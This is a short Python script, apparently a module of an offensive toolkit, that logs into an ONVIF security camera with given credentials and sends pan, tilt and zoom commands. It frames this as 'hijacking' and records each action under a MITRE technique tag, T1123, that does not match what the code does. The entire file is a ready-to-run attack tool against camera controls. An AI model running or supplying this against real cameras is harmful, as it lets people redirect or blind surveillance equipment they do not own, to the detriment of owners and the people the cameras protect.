#!/usr/bin/env python3
# modules/attacks/camera_ptz_hijacker.py

import os
import json
import time
import argparse
from datetime import datetime
from onvif import ONVIFCamera

LOG_FILE = "results/camera_ptz_hijack_log.json"
MITRE_TTP = "T1123"

def log_event(ip, action):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": ip,
        "action": action,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def hijack_ptz(ip, port, user, password, pan, tilt, zoom):
    try:
        cam = ONVIFCamera(ip, port, user, password)
        media_service = cam.create_media_service()
        ptz_service = cam.create_ptz_service()

        profile = media_service.GetProfiles()[0]
        token = profile.token

        request = ptz_service.create_type('ContinuousMove')
        request.ProfileToken = token
        request.Velocity = {'PanTilt': {'x': pan, 'y': tilt}, 'Zoom': {'x': zoom}}

        ptz_service.ContinuousMove(request)
        log_event(ip, f"Moved PTZ x:{pan}, y:{tilt}, zoom:{zoom}")
        print(f"[✓] PTZ movement command sent to {ip}")
    except Exception as e:
        print(f"[!] PTZ hijack failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack ONVIF-compliant camera PTZ controls")
    parser.add_argument("--ip", required=True, help="Target camera IP")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--user", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--pan", type=float, default=0.5)
    parser.add_argument("--tilt", type=float, default=0.5)
    parser.add_argument("--zoom", type=float, default=0.5)
    args = parser.parse_args()

    hijack_ptz(args.ip, args.port, args.user, args.password, args.pan, args.tilt, args.zoom)
